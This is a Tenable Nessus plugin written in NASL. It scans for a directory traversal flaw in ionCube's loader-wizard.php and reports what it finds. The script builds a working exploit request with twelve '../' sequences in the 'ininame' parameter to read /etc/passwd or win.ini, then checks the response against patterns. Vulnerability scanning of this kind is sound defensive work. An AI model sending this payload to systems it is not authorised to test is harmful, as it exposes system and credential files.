#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(73331);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 21:08:40 $");

  script_bugtraq_id(66531);
  script_osvdb_id(105179);

  script_name(english:"ionCube loader-wizard.php Remote Information Disclosure");
  script_summary(english:"Attempts to read a local file");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a PHP script that is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The ionCube 'loader-wizard.php' script hosted on the remote web server
is affected by a remote information disclosure vulnerability because
the script fails to properly sanitize user-supplied input to the
'ininame' parameter. An attacker could potentially leverage this to
view arbitrary files by forming a request containing directory
traversal sequences.

Note that the 'loader-wizard.php' script is also reportedly affected
by additional information disclosure issues as well as a cross-site
scripting vulnerability; however, Nessus has not tested for these
additional issues.");
  # http://www.firefart.net/multiple-vulnerabilities-in-ioncube-loader-wizard/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?9562db7d");
  script_set_attribute(attribute:"solution", value:
"Upgrade to version 2.46 or later and remove access to or remove the
'loader-wizard.php' script.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/03/30");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/03/04");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/04/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:ioncube:php_encoder");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("ioncube_loader_wizard_accessible.nasl", "os_fingerprint.nasl");
  script_require_keys("www/PHP", "www/ioncube");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname : "ioncube",
  port    : port,
  exit_on_fail : TRUE
);

dir = install["dir"];
install_url = build_url(qs:dir + "/loader-wizard.php", port:port);

# Determine what to look for.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) files = make_list('windows/win.ini', 'winnt/win.ini');
  else files = make_list('etc/passwd');
}
else files = make_list('etc/passwd', 'windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['etc/passwd'] = "root:.*:0:[01]:";
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

foreach file (files)
{
  vuln = FALSE;
  url = '?page=phpconfig&ininame=' + mult_str(str:"../", nb:12) + file +
    '&download=1';

  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : dir + '/loader-wizard.php' + url,
    exit_on_fail : TRUE
  );

  # If PHP on Windows was not compiled to set php_ini_scanned_files, the
  # 'Scan this dir for additional .ini files' of phpinfo() will be set to none
  # and the traversal attempt will instead return php.ini output instead of
  # our requested file
  if (file =~ 'win\\.ini$')
  {
    if (egrep(pattern:'^\\[PHP\\]|About php\\.ini', string:res[2]))
    {
      file = 'php.ini';
      url = '?page=phpconfig&ininame=' +file+ '&download=1';
      vuln = TRUE;
    }
  }
  if ( (!vuln) &&
    (egrep(pattern:file_pats[file], string:res[2]))
  ) vuln = TRUE;

  if (vuln)
  {
    if (report_verbosity > 0)
    {
      snip =  crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
      report =
        '\n' + 'Nessus was able to exploit the issue to retrieve the contents of '+
        '\n' + "'" + file + "'" + ' using the following request :' +
        '\n' +
        '\n' + install_url + url +
        '\n';

      if (report_verbosity > 1)
      {
        if (
          !defined_func("nasl_level") ||
          nasl_level() < 5200 ||
          !isnull(get_preference("sc_version"))
         )
        {
          report +=
            '\n' + 'This produced the following truncated output :' +
            '\n' + snip +
            '\n' + beginning_of_response(resp:chomp(res[2]), max_lines:'10') +
            '\n' + snip +
            '\n';
          security_warning(port:port, extra:report);
        }
        else
        {
          # Sanitize file names
          if ("/" >< file) file = ereg_replace(
            pattern:"^.+/([^/]+)$", replace:"\1", string:file);
          report +=
            '\n' + 'Attached is a copy of the response' + '\n';
          attachments = make_list();
          attachments[0] = make_array();
          attachments[0]["type"] = "text/plain";
          attachments[0]["name"] = file;
          attachments[0]["value"] = chomp(res[2]);

          security_report_with_attachments(
            port  : port,
            level : 2,
            extra : report,
            attachments : attachments
          );
        }
      }
      else security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, "ionCube", install_url);
